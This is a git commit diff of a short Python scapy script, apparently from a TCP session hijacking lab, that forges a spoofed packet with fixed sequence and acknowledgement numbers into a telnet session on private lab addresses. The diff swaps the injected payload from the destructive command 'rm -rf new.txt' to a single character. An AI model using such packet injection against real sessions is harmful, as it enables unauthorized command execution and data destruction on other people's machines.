2d7697982ff784635a128aeb9d03bb9c7546b233
Ethan Harris <576552241qwj@gmail.com>
2021-12-06 08:38:40 +0800

    main

--- Task3.py
+++ Task3.py
@@ -2,7 +2,7 @@
 from scapy.all import *
 ip  = IP(src="10.9.0.6", dst="10.9.0.5")
 tcp = TCP(sport=55912, dport=23, flags="A", seq=1984345377, ack=1470193045)
-data = "rm -rf new.txt\r"
+data = "r"
 pkt = ip/tcp/data
 ls(pkt)
 send(pkt, verbose=0)
